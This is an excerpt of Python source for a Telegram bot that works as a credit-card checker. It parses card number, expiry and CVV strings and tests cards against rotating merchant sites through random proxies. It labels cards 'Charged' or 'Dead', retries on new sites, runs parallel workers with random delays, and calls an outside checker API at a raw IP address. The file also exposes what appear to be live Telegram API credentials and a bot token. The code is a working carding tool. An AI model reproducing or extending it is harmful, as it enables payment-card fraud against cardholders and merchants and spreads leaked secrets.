...
# Bot Configuration
API_ID = 35928429
API_HASH = '63f36c3ba261d6321f90a095617906a7'
BOT_TOKEN = '8276772989:AAEQOGc2Z-6LVrKVWME8g95zY7R_gMS6h9M'
...
_DEAD_INDICATORS = (
    ...
    'site dead', 'captcha_required', 'captcha required', 'failed',
...
def extract_cc(text):
    ...
    pattern = pattern = pattern = r'(\d{15,16})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})'
            ...
            async with aiohttp.ClientSession(timeout=timeout) as session:
                ...
                for attempt in range(3):
                    ...
                    try:
                        ...
                        # 🔥 NO VARIANT RETRY
                        if "no variant" in response_lower:
                            print("NO VARIANT -> retry")
                        ...
                        # ❌ HARD DECLINE
                        elif "card_declined" in response_lower:
                            return {
                                'status': 'Dead',
                                'message': response_msg,
                                'card': card,
...
async def check_card_with_retry(card, sites, proxies, max_retries=5, used_sites=None):
    """Check a card with automatic retry - Never use same site twice"""
    last_result = None
    ...
    for attempt in range(max_retries):
        # Get available sites (exclude already used ones)
        available_sites = [s for s in sites if s not in used_sites]
        
        # If all sites have been used, reset the list
    ...
    # 👉 Proxy optional (oder None)
        proxy = random.choice(proxies) if proxies else None

        result = await check_card(card, site, proxy)

    # 👉 Wenn KEIN Retry → direkt Ergebnis zurückgeben
        if not result.get('retry'):
            return result

    # 👉 Wenn Retry → kurz warten und neue Site probieren
        await asyncio.sleep(0.5)

        last_result = result
    if attempt < max_retries - 1:
            await asyncio.sleep(0.5)  # Reduced from 0.5
...
🤖 <b>Bot By: <a href="tg://user?id=8315317975">A L B O</a></b>"""
...
async def test_site(site, proxy):
    test_card = "5455122802569146|12|26|543"
...
async def test_proxy(proxy):
    ...
    test_site_url = "https://httpbin.org/get"
    ...
    try:
        ...
        print("PROXY TEST RESPONSE:", raw)

        response_msg = str(raw.get("Response", "")).lower()
        error_msg = str(raw.get("error", "")).lower()

        full_text = response_msg + " " + error_msg + " " + str(raw).lower()
        ...
        if any(x in full_text for x in dead_keywords):
...
# CRITICAL FIXES FOR /CHK COMMAND

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    """Main check command - FIXED VERSION"""
    user_id = event.sender_id
    ...
    try:
        ...
        async def worker(worker_id):
            """Worker with proper error handling and logging"""
            while session_key in active_sessions:
                ...
                if not current_sites or not current_proxies:
                    print(f"Worker {worker_id}: No sites or proxies available")
                    break
                
                # Random delay between attempts
                await asyncio.sleep(random.uniform(0.5, 1.5))
                
                # IMPORTANT: Use max_retries=3 for file checks (not 1!)
                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=3)
                
                all_results['checked'] += 1
                
                # Debug logging
                print(f"Worker {worker_id}: Card {card[:10]}... Status: {res['status']}")
                ...
                if res['status'] == 'Charged':
                    ...
                    all_results['retry_cards'].append(card)   
                else:
                    all_results['dead'].append(res)
                    
                queue.task_done()
                
                # Real-time update throttle (1.0 sec)
                now = time.time()
        ...
        # INCREASE WORKERS FROM 1 TO 3-5 FOR PARALLEL PROCESSING
        num_workers = 3  # Can increase to 5 if API allows
        workers = [asyncio.create_task(worker(i)) for i in range(num_workers)]
        
        print(f"Starting {num_workers} workers for {total_cards} cards")
        ...
        # RETRY CARDS THAT HAD SITE ERRORS
        if all_results.get('retry_cards'):
            print(f"🔁 Retrying {len(all_results['retry_cards'])} cards with site errors...")
            
            for card in all_results['retry_cards'][:20]:  # Limit retries
                try:
                    res = await check_card_with_retry(card, load_sites(), load_proxies(), max_retries=5)
...
async def get_sites(event):
    ...
    if not sites:
        await event.reply("❌ No sites found")
        return
    ...
    await event.reply("📦 Here are your sites:", file=filename)
...
@bot.on(events.NewMessage(pattern='/apitest'))
async def apitest(event):
    import aiohttp
    import time

    url = "http://108.165.12.183:8081/"

    params = {
        "cc": "54551222802569146|12|26|543",
        "url": "https://test.com",
        "proxy": "test"
    }
    ...
    try:
        ...
        await event.reply("❌ TIMEOUT → API antwortet NICHT (oder ist zu langsam)")

    except Exception as e:
        await event.reply(f"❌ ERROR → API down oder blockiert\n\n{e}")
